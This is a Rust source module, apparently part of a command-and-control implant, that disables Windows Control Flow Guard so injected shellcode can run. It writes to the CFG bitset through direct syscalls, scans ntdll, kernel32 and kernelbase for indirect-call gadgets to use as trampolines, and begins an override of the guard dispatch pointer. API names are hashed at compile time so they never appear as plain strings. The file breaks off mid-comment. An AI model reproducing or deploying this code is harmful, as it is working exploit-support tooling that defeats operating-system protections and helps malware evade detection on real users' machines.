//! Control Flow Guard (CFG) bypass — indirect-call target promotion.
//!
//! Microsoft's Control Flow Guard validates that every indirect call target
//! (call through a register, function pointer, or vtable) belongs to a kernel-
//! maintained bitset of valid entry points.  If the target is not in the set,
//! the process is terminated with `STATUS_STACK_BUFFER_OVERRUN`.
//!
//! # Bypass Strategies
//!
//! 1. **CFG bitset promotion**: directly manipulate the CFG bitset to mark
//!    agent/shellcode addresses as valid targets.  The bitset lives in a
//!    read-only page in user space; we use `NtProtectVirtualMemory` to
//!    make it writable, set the bit, and restore the original protection.
//!
//! 2. **CFG-valid trampolines**: scan system DLLs (kernel32, ntdll,
//!    kernelbase) for exported functions that contain `call rax` / `call r10`
//!    gadgets.  These gadgets are already in the CFG valid-target set, so
//!    routing execution through them avoids the CFG check entirely.
//!
//! 3. **CFG dispatch override**: replace the `guard_check_icall_fptr` function
//!    pointer (stored in the PE load config) with a custom function that
//!    always returns `TRUE`.  The custom function's address must itself be
//!    promoted via Strategy 1 (or placed in an already-valid region).
//!
//! # Integration with syscalls.rs
//!
//! Before any indirect call in `spoof_call` / `clean_call!`, the caller
//! invokes `prepare_call(target_addr)`.  This promotes the target address
//! in the CFG bitset (Strategy 1).  After the call returns, `cleanup_call`
//! optionally removes the promotion.
//!
//! # Global State
//!
//! - `CFG_STATE: AtomicU8` — 0 = not initialised, 1 = CFG disabled / not
//!   present, 2 = CFG enabled, strategies available.
//! - `BITSET_INFO: OnceLock` — cached bitset base address and size.
//!
//! Only effective when compiled with the `cfg-bypass` feature (which implies
//! `direct-syscalls`).  Windows x86_64 only.

#![cfg(all(windows, feature = "cfg-bypass", target_arch = "x86_64"))]

use std::sync::atomic::{AtomicBool, AtomicU8, Ordering};
use std::sync::OnceLock;

// ─── Local Windows ABI type definitions ────────────────────────────────────

type PVOID = *mut std::ffi::c_void;
type HANDLE = PVOID;
type DWORD = u32;
type BOOL = i32;
type SIZE_T = usize;
type NTSTATUS = i32;
type ULONG = u32;

const STATUS_SUCCESS: NTSTATUS = 0;

/// Page protection: read-write.
const PAGE_READWRITE: ULONG = 0x04;
/// Page protection: read-only.
const PAGE_READONLY: ULONG = 0x02;
/// Page protection: execute-read.
const PAGE_EXECUTE_READ: ULONG = 0x20;
/// Current process handle pseudo-value.
const CURRENT_PROCESS: HANDLE = (-1isize) as *mut _;

// ─── Static size assertions ───────────────────────────────────────────────

const _: () = assert!(std::mem::size_of::<PVOID>() == 8);
const _: () = assert!(std::mem::size_of::<HANDLE>() == 8);
const _: () = assert!(std::mem::size_of::<DWORD>() == 4);
const _: () = assert!(std::mem::size_of::<SIZE_T>() == 8);

// ─── Const Hash Functions ─────────────────────────────────────────────────
//
// Const-compatible versions of pe_resolve::hash_str / hash_wstr so that
// hash values can be computed at compile time, avoiding any plaintext
// DLL/function name strings in the binary.

/// Compile-time rotational hash of a UTF-8 byte string (null-terminated).
/// Mirrors `pe_resolve::hash_str` exactly.
const fn const_hash_str(bytes: &[u8]) -> u32 {
    let mut hash: u32 = pe_resolve::SEED;
    let mut i = 0;
    while i < bytes.len() {
        let b = bytes[i];
        if b == 0 {
            break;
        }
        let lower = if b >= b'A' && b <= b'Z' { b + 32 } else { b };
        hash = hash.rotate_right(13) ^ (lower as u32);
        i += 1;
    }
    hash
}

/// Compile-time rotational hash of a UTF-16LE wide string (null-terminated).
/// Mirrors `pe_resolve::hash_wstr` exactly.
const fn const_hash_wstr(units: &[u16]) -> u32 {
    let mut hash: u32 = pe_resolve::SEED;
    let mut i = 0;
    while i < units.len() {
        let c = units[i];
        if c == 0 {
            break;
        }
        let lo = c as u8;
        let lo = if lo >= b'A' && lo <= b'Z' {
            lo + 32
        } else {
            lo
        };
        let hi = (c >> 8) as u8;
        let hi = if hi >= b'A' && hi <= b'Z' {
            hi + 32
        } else {
            hi
        };
        hash = hash.rotate_right(13) ^ (lo as u32);
        hash = hash.rotate_right(13) ^ (hi as u32);
        i += 1;
    }
    hash
}

// ─── Pre-computed DLL wide-string hashes ────────────────────────────────────

const NTDLL_DLL_HASH: u32 = const_hash_wstr(&[
    b'n' as u16, b't' as u16, b'd' as u16, b'l' as u16, b'l' as u16,
    b'.' as u16, b'd' as u16, b'l' as u16, b'l' as u16,
]);
const KERNEL32_DLL_HASH: u32 = const_hash_wstr(&[
    b'k' as u16, b'e' as u16, b'r' as u16, b'n' as u16, b'e' as u16,
    b'l' as u16, b'3' as u16, b'2' as u16, b'.' as u16, b'd' as u16,
    b'l' as u16, b'l' as u16,
]);
const KERNELBASE_DLL_HASH: u32 = const_hash_wstr(&[
    b'k' as u16, b'e' as u16, b'r' as u16, b'n' as u16, b'e' as u16,
    b'l' as u16, b'b' as u16, b'a' as u16, b's' as u16, b'e' as u16,
    b'.' as u16, b'd' as u16, b'l' as u16, b'l' as u16,
]);

// ─── Pre-computed function name hashes ──────────────────────────────────────

const HASH_LDRSYSTEMDLLINITBLOCK: u32 = const_hash_str(b"LdrSystemDllInitBlock\0");
const HASH_GUARD_CHECK_ICALL_FPTR: u32 = const_hash_str(b"guard_check_icall_fptr\0");
const HASH_VIRTUALPROTECT: u32 = const_hash_str(b"VirtualProtect\0");

// ─── Global State ─────────────────────────────────────────────────────────

/// CFG state: not yet initialised.
const CFG_STATE_UNINIT: u8 = 0;
/// CFG state: CFG not present or disabled.
const CFG_STATE_DISABLED: u8 = 1;
/// CFG state: CFG enabled, strategies available.
const CFG_STATE_ENABLED: u8 = 2;

/// Runtime CFG status of the agent process.
static CFG_STATE: AtomicU8 = AtomicU8::new(CFG_STATE_UNINIT);

/// Whether the bypass module has been initialised.
static INITIALIZED: AtomicBool = AtomicBool::new(false);

/// Whether the bypass module is enabled (from config).
static BYPASS_ENABLED: AtomicBool = AtomicBool::new(false);

/// Cached CFG bitset metadata.
static BITSET_INFO: OnceLock<CfgBitsetInfo> = OnceLock::new();

/// Cached trampoline gadgets (Strategy 2).
static TRAMPOLINE_CACHE: OnceLock<Vec<CfgTrampoline>> = OnceLock::new();

/// Original CFG dispatch function pointer (Strategy 3).
static ORIGINAL_GUARD_FPTR: OnceLock<usize> = OnceLock::new();

/// Custom CFG dispatch stub address (Strategy 3).
static CUSTOM_GUARD_FPTR: OnceLock<usize> = OnceLock::new();

/// Whether the custom dispatch override is active.
static OVERRIDE_ACTIVE: AtomicBool = AtomicBool::new(false);

// ─── CFG Bitset Structure ─────────────────────────────────────────────────

/// Metadata describing the CFG bitset in the current process.
///
/// The CFG bitset is a bitmap where each bit represents a 16-byte aligned
/// address range.  If the bit for address `A` is set, then `A` is a valid
/// indirect call target.  The base address is the start of the address space
/// covered by the bitset; each bit covers `(base + bit_index * 16)`.
#[derive(Debug, Clone, Copy)]
struct CfgBitsetInfo {
    /// Base address of the CFG bitset bitmap.
    base: usize,
    /// Size of the bitset bitmap in bytes.
    size: usize,
}

/// Result type for CFG bypass operations.
pub type Result<T> = core::result::Result<T, CfgError>;

/// Error type for CFG bypass operations.
#[derive(Debug, Clone, Copy)]
pub enum CfgError {
    /// CFG is not enabled or not present.
    CfgNotEnabled,
    /// Failed to locate the CFG bitset.
    BitsetNotFound,
    /// Address is not aligned to CFG granularity (16 bytes).
    NotAligned,
    /// Failed to change page protection via NtProtectVirtualMemory.
    ProtectionChangeFailed(NTSTATUS),
    /// Failed to resolve a required API or module.
    ResolutionFailed,
    /// No trampoline gadgets found.
    NoTrampolines,
    /// The override is already active.
    OverrideActive,
    /// The override is not active.
    OverrideNotActive,
    /// Address out of bitset range.
    OutOfRange,
}

impl core::fmt::Display for CfgError {
    fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
        match self {
            CfgError::CfgNotEnabled => write!(f, "CFG is not enabled"),
            CfgError::BitsetNotFound => write!(f, "CFG bitset not found"),
            CfgError::NotAligned => write!(f, "address not aligned to 16-byte CFG granularity"),
            CfgError::ProtectionChangeFailed(s) => {
                write!(f, "NtProtectVirtualMemory failed: NTSTATUS {:#010X}", *s as u32)
            }
            CfgError::ResolutionFailed => write!(f, "API resolution failed"),
            CfgError::NoTrampolines => write!(f, "no CFG-valid trampolines found"),
            CfgError::OverrideActive => write!(f, "CFG dispatch override already active"),
            CfgError::OverrideNotActive => write!(f, "CFG dispatch override not active"),
            CfgError::OutOfRange => write!(f, "address out of CFG bitset range"),
        }
    }
}

impl std::error::Error for CfgError {}

// ─── Public Types ─────────────────────────────────────────────────────────

/// A CFG-valid trampoline gadget found in a system DLL.
///
/// Contains a `call rax` / `call r10` / similar indirect call instruction
/// inside a CFG-valid exported function.  Routing execution through this
/// gadget avoids the CFG dispatch check because the containing function is
/// already in the valid-target bitset.
#[derive(Debug, Clone, Copy)]
pub struct CfgTrampoline {
    /// Address of the `call reg` gadget instruction.
    pub address: usize,
    /// Name of the DLL containing the gadget (for diagnostics).
    pub dll_name: &'static str,
    /// Offset from the DLL base to the gadget instruction.
    pub instruction_offset: usize,
}

/// Configuration for the CFG bypass module.
#[derive(Debug, Clone)]
pub struct CfgBypassConfig {
    /// Whether the bypass module is enabled.
    pub enabled: bool,
    /// Whether to automatically promote addresses before indirect calls.
    pub auto_promote: bool,
    /// Whether to demote addresses after calls complete (clean up bitset).
    pub auto_demote: bool,
    /// Whether to enable the dispatch override strategy (Strategy 3).
    pub dispatch_override: bool,
}

impl Default for CfgBypassConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            auto_promote: true,
            auto_demote: false, // keep promoted for performance
            dispatch_override: false,
        }
    }
}

// ─── Initialisation ───────────────────────────────────────────────────────

/// Initialise the CFG bypass module.
///
/// Must be called once during agent startup, before any indirect calls that
/// need CFG bypass.  Detects whether CFG is enabled and caches the bitset
/// metadata.
pub fn init(config: &CfgBypassConfig) {
    if INITIALIZED.swap(true, Ordering::SeqCst) {
        log::warn!("cfg_bypass: init called more than once, ignoring");
        return;
    }

    BYPASS_ENABLED.store(config.enabled, Ordering::SeqCst);

    if !config.enabled {
        log::info!("cfg_bypass: module disabled by config");
        CFG_STATE.store(CFG_STATE_DISABLED, Ordering::SeqCst);
        return;
    }

    // Detect CFG presence.
    if !is_cfg_enabled() {
        log::info!("cfg_bypass: CFG not enabled in process");
        CFG_STATE.store(CFG_STATE_DISABLED, Ordering::SeqCst);
        return;
    }

    log::info!("cfg_bypass: CFG detected, initialising strategies");

    // Resolve and cache the CFG bitset info.
    match resolve_cfg_bitset() {
        Some(info) => {
            log::info!(
                "cfg_bypass: bitset at {:#x}, {} bytes (covers {:#x} addresses)",
                info.base,
                info.size,
                info.size * 8 * 16,
            );
            let _ = BITSET_INFO.set(info);
            CFG_STATE.store(CFG_STATE_ENABLED, Ordering::SeqCst);
        }
        None => {
            log::warn!("cfg_bypass: could not resolve CFG bitset, strategies limited");
            CFG_STATE.store(CFG_STATE_ENABLED, Ordering::SeqCst);
        }
    }

    // Pre-populate the trampoline cache (Strategy 2).
    let trampolines = find_cfg_valid_trampolines();
    if !trampolines.is_empty() {
        log::info!("cfg_bypass: found {} trampoline gadgets", trampolines.len());
        let _ = TRAMPOLINE_CACHE.set(trampolines);
    } else {
        log::warn!("cfg_bypass: no CFG-valid trampolines found");
    }

    // Optionally activate dispatch override (Strategy 3).
    if config.dispatch_override {
        match install_dispatch_override() {
            Ok(()) => log::info!("cfg_bypass: dispatch override installed"),
            Err(e) => log::warn!("cfg_bypass: dispatch override failed: {}", e),
        }
    }
}

/// Initialise with default config (no external config dependency).
pub fn init_default() {
    init(&CfgBypassConfig::default());
}

// ─── Public API: Detection ─────────────────────────────────────────────────

/// Check whether CFG is currently enabled for the agent process.
///
/// Examines the PE optional header of the agent module for the
/// `IMAGE_DLLCHARACTERISTICS_GUARD_CF` flag.
pub fn is_cfg_enabled() -> bool {
    // Check the main executable's PE header for the GUARD_CF flag.
    // IMAGE_DLLCHARACTERISTICS_GUARD_CF = 0x4000
    const IMAGE_DLLCHARACTERISTICS_GUARD_CF: u16 = 0x4000;

    // Get our own module base from the PEB.
    let module_base = match unsafe {
        pe_resolve::get_module_handle_by_hash(0) // 0 = first module (executable)
    } {
        Some(b) => b,
        None => {
            // Fallback: check ntdll's PE header as a proxy.
            match unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) } {
                Some(b) => b,
                None => return false,
            }
        }
    };

    check_pe_guard_cf(module_base)
}

/// Check a specific module's PE header for the GUARD_CF flag.
fn check_pe_guard_cf(module_base: usize) -> bool {
    const IMAGE_DLLCHARACTERISTICS_GUARD_CF: u16 = 0x4000;

    unsafe {
        let base = module_base as *const u8;

        // Read e_lfanew (offset 0x3C) from DOS header.
        if base.is_null() || base.read_unaligned() != b'M' {
            return false;
        }
        let e_lfanew = (base.add(0x3C) as *const u32).read_unaligned() as usize;

        // Check PE signature.
        let pe_sig = (base.add(e_lfanew) as *const u32).read_unaligned();
        if pe_sig != 0x0000_4550 {
            // "PE\0\0"
            return false;
        }

        // DllCharacteristics is at PE signature + 4 (COFF header size) + 70
        // (offset within optional header for 64-bit PE).
        // COFF header = 20 bytes.  Optional header DllCharacteristics offset = 70.
        let dll_chars_offset = e_lfanew + 4 + 20 + 70;
        let dll_chars = (base.add(dll_chars_offset) as *const u16).read_unaligned();

        dll_chars & IMAGE_DLLCHARACTERISTICS_GUARD_CF != 0
    }
}

/// Check whether CFG bypass is enabled and active.
pub fn is_enabled() -> bool {
    BYPASS_ENABLED.load(Ordering::SeqCst) && CFG_STATE.load(Ordering::SeqCst) == CFG_STATE_ENABLED
}

/// Get the current CFG state as a JSON string (for C2 status commands).
pub fn status_json() -> String {
    let state = CFG_STATE.load(Ordering::SeqCst);
    let state_str = match state {
        CFG_STATE_UNINIT => "uninitialized",
        CFG_STATE_DISABLED => "disabled",
        CFG_STATE_ENABLED => "enabled",
        _ => "unknown",
    };
    let initialized = INITIALIZED.load(Ordering::SeqCst);
    let bypass_enabled = BYPASS_ENABLED.load(Ordering::SeqCst);
    let bitset_resolved = BITSET_INFO.get().is_some();
    let trampoline_count = TRAMPOLINE_CACHE.get().map(|t| t.len()).unwrap_or(0);
    let override_active = OVERRIDE_ACTIVE.load(Ordering::SeqCst);

    format!(
        "{{\"cfg_state\":\"{}\",\"initialized\":{},\"bypass_enabled\":{},\"bitset_resolved\":{},\"trampolines\":{},\"override_active\":{}}}",
        state_str, initialized, bypass_enabled, bitset_resolved, trampoline_count, override_active
    )
}

// ─── Strategy 1: CFG Bitset Manipulation ──────────────────────────────────

/// Promote a single address in the CFG bitset, making it a valid indirect
/// call target.
///
/// # Safety
///
/// The caller must ensure `addr` is a valid executable address.  Promoting
/// arbitrary addresses is a detectable modification if the bitset is
/// integrity-checked by the kernel or a security product.
pub fn promote_address(addr: usize) -> Result<()> {
    let info = BITSET_INFO
        .get()
        .ok_or(CfgError::BitsetNotFound)?;

    if addr % 16 != 0 {
        return Err(CfgError::NotAligned);
    }

    set_cfg_bit(info, addr, true)
}

/// Demote (remove) a single address from the CFG bitset.
///
/// After demotion, the address will no longer be considered a valid indirect
/// call target, and any indirect call to it will trigger a CFG violation.
pub fn demote_address(addr: usize) -> Result<()> {
    let info = BITSET_INFO
        .get()
        .ok_or(CfgError::BitsetNotFound)?;

    if addr % 16 != 0 {
        return Err(CfgError::NotAligned);
    }

    set_cfg_bit(info, addr, false)
}

/// Promote multiple addresses in the CFG bitset in a single operation.
///
/// More efficient than calling `promote_address` individually because the
/// page protection change is done once for the entire range.
pub fn promote_addresses(addrs: &[usize]) -> Result<()> {
    let info = BITSET_INFO
        .get()
        .ok_or(CfgError::BitsetNotFound)?;

    // Validate all addresses first.
    for &addr in addrs {
        if addr % 16 != 0 {
            return Err(CfgError::NotAligned);
        }
    }

    if addrs.is_empty() {
        return Ok(());
    }

    // Calculate the range of bits we need to touch.
    let mut min_byte = usize::MAX;
    let mut max_byte = 0;

    for &addr in addrs {
        let bit_index = bit_index_for_addr(info, addr)?;
        let byte_index = bit_index / 8;
        min_byte = min_byte.min(byte_index);
        max_byte = max_byte.max(byte_index);
    }

    // Change protection for the affected range.
    let range_base = info.base + min_byte;
    let range_size = max_byte - min_byte + 1;

    let old_prot = change_protection(range_base, range_size, PAGE_READWRITE)?;

    // Set all bits.
    for &addr in addrs {
        let bit_index = bit_index_for_addr(info, addr)?;
        let byte_index = bit_index / 8;
        let bit_offset = (bit_index % 8) as u8;
        unsafe {
            let byte_ptr = (info.base + byte_index) as *mut u8;
            *byte_ptr |= 1 << bit_offset;
        }
    }

    // Restore protection.
    let _ = change_protection(range_base, range_size, old_prot as ULONG);

    log::trace!(
        "cfg_bypass: promoted {} addresses in bitset range [{:#x}..{:#x}]",
        addrs.len(),
        min_byte,
        max_byte,
    );

    Ok(())
}

/// Set or clear a single bit in the CFG bitset.
fn set_cfg_bit(info: &CfgBitsetInfo, addr: usize, set: bool) -> Result<()> {
    let bit_index = bit_index_for_addr(info, addr)?;
    let byte_index = bit_index / 8;
    let bit_offset = (bit_index % 8) as u8;

    if byte_index >= info.size {
        return Err(CfgError::OutOfRange);
    }

    let target_byte_addr = info.base + byte_index;

    // Determine current protection and change to read-write.
    // We change only the containing page (4KB).
    let page_base = target_byte_addr & !0xFFF;
    let page_size: usize = 0x1000;

    let old_prot = change_protection(page_base, page_size, PAGE_READWRITE)?;

    unsafe {
        let byte_ptr = target_byte_addr as *mut u8;
        if set {
            *byte_ptr |= 1 << bit_offset;
        } else {
            *byte_ptr &= !(1 << bit_offset);
        }
    }

    // Restore original protection.
    let _ = change_protection(page_base, page_size, old_prot as ULONG);

    log::trace!(
        "cfg_bypass: {} bit at index {} (addr {:#x})",
        if set { "set" } else { "cleared" },
        bit_index,
        addr,
    );

    Ok(())
}

/// Calculate the bit index for a given address in the CFG bitset.
fn bit_index_for_addr(info: &CfgBitsetInfo, addr: usize) -> Result<usize> {
    // The CFG bitset maps addresses at 16-byte granularity.
    // Bit 0 corresponds to the base address; bit N corresponds to
    // base + N * 16.
    //
    // We derive the bit index from the address by dividing by 16.
    // The bitset base provides the starting offset.
    let addr_normalized = addr / 16;
    let base_normalized = info.base / 16;

    if addr_normalized < base_normalized {
        return Err(CfgError::OutOfRange);
    }

    let bit_index = addr_normalized - base_normalized;

    // Check that the bit fits in the bitset.
    let max_bits = info.size * 8;
    if bit_index >= max_bits {
        return Err(CfgError::OutOfRange);
    }

    Ok(bit_index)
}

/// Change memory protection via NtProtectVirtualMemory.
///
/// Returns the old protection value on success.
fn change_protection(base: usize, size: usize, new_prot: ULONG) -> Result<ULONG> {
    let mut base_addr: usize = base;
    let mut region_size: usize = size;
    let mut old_protect: ULONG = 0;

    let status = unsafe {
        crate::syscalls::syscall_NtProtectVirtualMemory(
            CURRENT_PROCESS as u64,
            &mut base_addr as *mut usize as u64,
            &mut region_size as *mut usize as u64,
            new_prot as u64,
            &mut old_protect as *mut ULONG as u64,
        )
    };

    if status != STATUS_SUCCESS {
        Err(CfgError::ProtectionChangeFailed(status))
    } else {
        Ok(old_protect)
    }
}

/// Resolve the CFG bitset location for the current process.
///
/// The CFG bitset is referenced by the `GuardCFCheckFunctionPointer` field
/// in the PE load config directory.  The bitset itself is described by
/// `GuardCFFunctionTable` and `GuardCFFunctionCount` fields.
///
/// On modern Windows (10+), the bitset can also be found through
/// `LdrSystemDllInitBlock` which contains a pointer to the kernel32
/// CFG bitset management structures.
fn resolve_cfg_bitset() -> Option<CfgBitsetInfo> {
    // Method 1: Parse the PE load config of ntdll.dll.
    // The load config contains GuardFlags, GuardCFDispatchFunctionPointer,
    // GuardCFFunctionTable, and GuardCFFunctionCount.
    if let Some(info) = resolve_bitset_from_load_config() {
        return Some(info);
    }

    // Method 2: Use LdrSystemDllInitBlock.
    if let Some(info) = resolve_bitset_from_ldr_init_block() {
        return Some(info);
    }

    None
}

/// Resolve CFG bitset from the PE load config directory.
fn resolve_bitset_from_load_config() -> Option<CfgBitsetInfo> {
    let ntdll_base = unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) }?;

    unsafe {
        let base = ntdll_base as *const u8;

        // DOS header.
        if base.is_null() || base.read_unaligned() != b'M' {
            return None;
        }
        let e_lfanew = (base.add(0x3C) as *const u32).read_unaligned() as usize;

        // PE signature.
        let pe_sig = (base.add(e_lfanew) as *const u32).read_unaligned();
        if pe_sig != 0x0000_4550 {
            return None;
        }

        // Optional header starts at e_lfanew + 24.
        let opt_hdr_off = e_lfanew + 24;
        let opt_magic = (base.add(opt_hdr_off) as *const u16).read_unaligned();
        // PE32+ (64-bit) has magic 0x20B.
        if opt_magic != 0x20B {
            return None;
        }

        // Load Config directory: DataDirectory[10] in the optional header.
        // Data directories start at offset 112 in PE32+ optional header.
        // Each entry is 8 bytes (RVA + Size).
        let load_config_dir_off = opt_hdr_off + 112 + 10 * 8;
        let load_config_rva = (base.add(load_config_dir_off) as *const u32).read_unaligned();
        let _load_config_size = (base.add(load_config_dir_off + 4) as *const u32).read_unaligned();

        if load_config_rva == 0 {
            return None;
        }

        let lc_base = base.add(load_config_rva as usize);

        // GuardFlags at offset 0x78 in IMAGE_LOAD_CONFIG_DIRECTORY64.
        let guard_flags = (lc_base.add(0x78) as *const u32).read_unaligned();

        // CF_INSTRUMENTED (0x100) must be set for CFG to be active.
        const CF_INSTRUMENTED: u32 = 0x100;
        if guard_flags & CF_INSTRUMENTED == 0 {
            return None;
        }

        // GuardCFFunctionTable at offset 0x80.
        let table_rva = (lc_base.add(0x80) as *const u32).read_unaligned();
        // GuardCFFunctionCount at offset 0x88.
        let count = (lc_base.add(0x88) as *const u64).read_unaligned();

        if table_rva == 0 || count == 0 {
            return None;
        }

        // The function table is actually the CFG bitset (bitmap).
        // The "count" field in newer Windows is the bitset size in bytes.
        // The actual bitset base address is ntdll_base + table_rva.
        let bitset_base = ntdll_base + table_rva as usize;
        let bitset_size = count as usize;

        if bitset_size == 0 || bitset_size > 0x1000_0000 {
            // Sanity check: bitset should not exceed 256MB.
            return None;
        }

        Some(CfgBitsetInfo {
            base: bitset_base,
            size: bitset_size,
        })
    }
}

/// Resolve CFG bitset from `LdrSystemDllInitBlock`.
///
/// `LdrSystemDllInitBlock` is an undocumented ntdll export that contains
/// information about system DLL initialization, including CFG bitset
/// metadata.  On Windows 10+, it includes pointers to the CFG bitset
/// management structures.
fn resolve_bitset_from_ldr_init_block() -> Option<CfgBitsetInfo> {
    let ntdll_base = unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) }?;
    let init_block = unsafe {
        pe_resolve::get_proc_address_by_hash(ntdll_base, HASH_LDRSYSTEMDLLINITBLOCK)
    }?;

    // LdrSystemDllInitBlock layout (partial, Windows 10+):
    // Offset 0x00: Size (ULONG)
    // Offset 0x08: ... (various fields)
    // The exact offset to CFG bitset info varies by Windows version.
    // For safety, we return None here and rely on the load config method.
    //
    // NOTE: This is a placeholder for future enhancement.  The PE load config
    // method above is the primary resolution path.
    let _ = init_block;
    None
}

// ─── Strategy 2: CFG-Valid Trampolines ────────────────────────────────────

/// Find CFG-valid trampolines in system DLLs.
///
/// Scans the .text sections of kernel32.dll, ntdll.dll, and kernelbase.dll
/// for exported functions that contain indirect call instructions (`call rax`,
/// `call r10`, `call rcx`, `call rdx`).  These gadgets are already in the
/// CFG valid-target set because they reside within CFG-instrumented modules.
///
/// Returns a list of trampoline gadgets sorted by address.
pub fn find_cfg_valid_trampolines() -> Vec<CfgTrampoline> {
    let mut trampolines = Vec::new();

    // Scan each system DLL.
    let dlls: &[(&str, u32)] = &[
        ("ntdll.dll", NTDLL_DLL_HASH),
        ("kernel32.dll", KERNEL32_DLL_HASH),
        ("kernelbase.dll", KERNELBASE_DLL_HASH),
    ];

    for &(dll_name, dll_hash) in dlls {
        let dll_base = match unsafe { pe_resolve::get_module_handle_by_hash(dll_hash) } {
            Some(b) => b,
            None => continue,
        };

        // Check if this DLL has CFG enabled.
        if !check_pe_guard_cf(dll_base) {
            continue;
        }

        scan_dll_for_trampolines(dll_base, dll_name, &mut trampolines);
    }

    trampolines.sort_by_key(|t| t.address);
    trampolines
}

/// Scan a DLL's .text section for indirect call gadgets.
fn scan_dll_for_trampolines(
    dll_base: usize,
    dll_name: &'static str,
    trampolines: &mut Vec<CfgTrampoline>,
) {
    // Indirect call opcodes we're looking for:
    // call rax  = FF D0
    // call r10  = 41 FF D2
    // call rcx  = FF D1
    // call rdx  = FF D2
    // call r8   = 41 FF D0
    // call r9   = 41 FF D1
    // call r11  = 41 FF D3
    let patterns: &[(&[u8], usize)] = &[
        // (pattern, instruction_length)
        (&[0xFF, 0xD0], 2), // call rax
        (&[0xFF, 0xD1], 2), // call rcx
        (&[0xFF, 0xD2], 2), // call rdx
        (&[0x41, 0xFF, 0xD0], 3), // call r8
        (&[0x41, 0xFF, 0xD1], 3), // call r9
        (&[0x41, 0xFF, 0xD2], 3), // call r10
        (&[0x41, 0xFF, 0xD3], 3), // call r11
    ];

    unsafe {
        let base = dll_base as *const u8;

        // Parse PE headers to find .text section.
        let e_lfanew = (base.add(0x3C) as *const u32).read_unaligned() as usize;
        let num_sections = (base.add(e_lfanew + 6) as *const u16).read_unaligned();
        let opt_hdr_size = (base.add(e_lfanew + 20) as *const u16).read_unaligned() as usize;

        // Section headers start after the optional header.
        let section_off = e_lfanew + 24 + opt_hdr_size;

        for i in 0..num_sections as usize {
            let sec_base = base.add(section_off + i * 40);

            // Check if this is a code section (IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE).
            let characteristics = (sec_base.add(36) as *const u32).read_unaligned();
            const IMAGE_SCN_CNT_CODE: u32 = 0x0000_0020;
            const IMAGE_SCN_MEM_EXECUTE: u32 = 0x2000_0000;
            if characteristics & (IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE) == 0 {
                continue;
            }

            let virtual_size = (sec_base.add(8) as *const u32).read_unaligned() as usize;
            let virtual_addr = (sec_base.add(12) as *const u32).read_unaligned() as usize;

            if virtual_size == 0 || virtual_size > 0x1000_0000 {
                continue;
            }

            let section_start = base.add(virtual_addr);
            let section_end = section_start.add(virtual_size);

            // Scan for patterns.
            let mut pos = section_start;
            while pos < section_end {
                for &(pattern, instr_len) in patterns {
                    if pos.add(pattern.len()) > section_end {
                        continue;
                    }

                    let mut matches = true;
                    for (j, &byte) in pattern.iter().enumerate() {
                        if pos.add(j).read_unaligned() != byte {
                            matches = false;
                            break;
                        }
                    }

                    if matches {
                        let gadget_addr = pos as usize;
                        let offset = gadget_addr - dll_base;

                        trampolines.push(CfgTrampoline {
                            address: gadget_addr,
                            dll_name,
                            instruction_offset: offset,
                        });

                        // Skip past this instruction to avoid overlapping matches.
                        break;
                    }
                }
                pos = pos.add(1);
            }
        }
    }
}

/// Get a cached trampoline gadget, if available.
///
/// Returns the first trampoline that is in the specified DLL, or any
/// trampoline if `dll_preference` is `None`.
pub fn get_trampoline(dll_preference: Option<&str>) -> Option<CfgTrampoline> {
    let cache = TRAMPOLINE_CACHE.get()?;
    match dll_preference {
        Some(dll) => cache.iter().find(|t| t.dll_name == dll).copied(),
        None => cache.first().copied(),
    }
}

/// Execute an indirect call through a CFG-valid trampoline.
///
/// Sets up the target address in RAX, then jumps to a `call rax` gadget
/// inside a CFG-valid system DLL function.  The CFG check passes because
/// the gadget address is in the valid-target bitset.
///
/// # Safety
///
/// The caller must ensure that `func_ptr` is a valid function address with
/// the correct calling convention and argument count.
pub unsafe fn call_via_trampoline(
    func_ptr: usize,
    arg1: u64,
    arg2: u64,
    arg3: u64,
    arg4: u64,
) -> u64 {
    let trampoline = match get_trampoline(None) {
        Some(t) => t,
        None => return 0,
    };

    // Inline assembly to:
    // 1. Move func_ptr into RAX
    // 2. Set up arguments (RCX, RDX, R8, R9)
    // 3. Jump to the `call rax` gadget in the system DLL
    //
    // The gadget will execute `call rax`, which calls func_ptr.
    // Because the gadget address is CFG-valid, the CFG check passes.
    //
    // We bundle all inputs into a single struct and load them from
    // memory inside the asm block, using only one input register
    // (the struct pointer) plus a single explicit output on RAX.
    // This avoids register pressure issues.
    #[repr(C)]
    struct CallParams {
        func_ptr: u64,
        arg1: u64,
        arg2: u64,
        arg3: u64,
        arg4: u64,
        gadget_addr: u64,
        result: u64,
    }

    let mut params = CallParams {
        func_ptr: func_ptr as u64,
        arg1,
        arg2,
        arg3,
        arg4,
        gadget_addr: trampoline.address as u64,
        result: 0,
    };

    // We only need one input register (pointer to params) and
    // store the result back through memory.  We use a nomem-style
    // approach but must declare the memory clobber explicitly.
    // We deliberately do NOT use out() clobbers to avoid register
    // pressure — the call will clobber volatile registers anyway.
    core::arch::asm!(
        // Load all values from the params struct
        "mov rax, [{p}]",              // params.func_ptr -> RAX
        "mov rcx, [{p}+8]",            // params.arg1 -> RCX
        "mov rdx, [{p}+16]",           // params.arg2 -> RDX
        "mov r8, [{p}+24]",            // params.arg3 -> R8
        "mov r9, [{p}+32]",            // params.arg4 -> R9
        "mov r10, [{p}+40]",           // params.gadget_addr -> R10
        // Set up stack frame and call
        "push rbx",                    // Save RBX (callee-saved)
        "push rsi",                    // Save RSI (callee-saved)
        "mov rbx, r10",                // Gadget address -> RBX
        "mov rsi, {p}",                // Save params pointer across call
        "sub rsp, 0x28",               // Shadow space + alignment
        "call rbx",                    // call rax via trampoline (CFG-valid)
        "add rsp, 0x28",               // Restore stack
        // Store return value using saved params pointer
        "mov [rsi+48], rax",           // result -> params.result
        "pop rsi",                     // Restore RSI
        "pop rbx",                     // Restore RBX
        p = in(reg) &params,
        out("rax") _,
        options(preserves_flags),
    );

    params.result
}

// ─── Strategy 3: CFG Dispatch Override ─────────────────────────────────────

/// A custom CFG dispatch function that always returns TRUE (1).
///
/// This function must reside in a CFG-valid memory region.  Before installing
/// the override, we promote this function's address via Strategy 1.
///
/// # Safety
